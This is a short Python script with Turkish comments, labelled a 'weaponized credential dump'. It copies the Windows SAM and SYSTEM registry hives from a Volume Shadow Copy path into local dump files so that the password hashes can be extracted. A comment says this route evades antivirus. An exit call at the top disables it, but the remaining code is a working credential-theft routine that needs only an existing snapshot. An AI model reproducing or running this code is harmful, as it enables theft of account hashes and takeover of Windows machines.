import sys
import shutil
import os

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod SAM ve SYSTEM dosyalarını kopyalar.")

print("--- WEAPONIZED CREDENTIAL DUMP ---")

def shadow_copy_steal():
    # 1. HEDEF YOL (Weaponized Part)
    # Simülasyonda: os.system("reg save ...") -> Diske yazar, AV yakalar.
    # Gerçekte: VSS (Gölge Kopya) üzerinden okuruz.
    
    # Not: Bu yolun çalışması için önce vssadmin ile snapshot oluşturulması gerekir.
    # Biz burada oluşan snapshot'ın yolunu simüle ediyoruz.
    vss_root = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
    
    sam_path = os.path.join(vss_root, "Windows\\System32\\config\\SAM")
    sys_path = os.path.join(vss_root, "Windows\\System32\\config\\SYSTEM")
    
    print(f"[*] VSS Yolu: {sam_path}")
    
    try:
        # Dosyalar kullanımda olsa bile (Locked) VSS üzerinden kopyalanabilir.
        shutil.copy(sam_path, "SAM_DUMP")
        shutil.copy(sys_path, "SYSTEM_DUMP")
        print("💀 BAŞARILI: Hash dosyaları kopyalandı.")
        
    except FileNotFoundError:
        print("[-] Önce Shadow Copy oluşturulmalı.")

if __name__ == "__main__":
    shadow_copy_steal()